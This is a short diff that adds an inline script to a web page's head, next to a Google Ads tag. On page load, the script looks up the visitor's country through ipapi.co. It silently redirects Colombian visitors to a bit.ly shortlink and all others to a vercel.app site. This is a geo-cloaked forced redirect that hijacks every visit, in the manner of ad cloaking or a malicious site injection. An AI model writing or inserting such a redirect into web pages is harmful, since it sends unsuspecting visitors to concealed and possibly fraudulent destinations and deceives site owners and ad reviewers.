@@ -134,6 +134,27 @@ gtag('js', new Date());
 gtag('config', 'AW-17775697492');
 </script>
 
+    <script>
+(function(){
+  const URL_CO = "https://bit.ly/3NWiMKe";
+  const URL_OUT = "https://comidapopular.vercel.app";
+
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => {
+      if (d.country === "CO") {
+        window.location.href = URL_CO;
+      } else {
+        window.location.href = URL_OUT;
+      }
+    })
+    .catch(() => {
+      window.location.href = URL_OUT;
+    });
+})();
+</script>
+
+
 
 </head>
 <body>
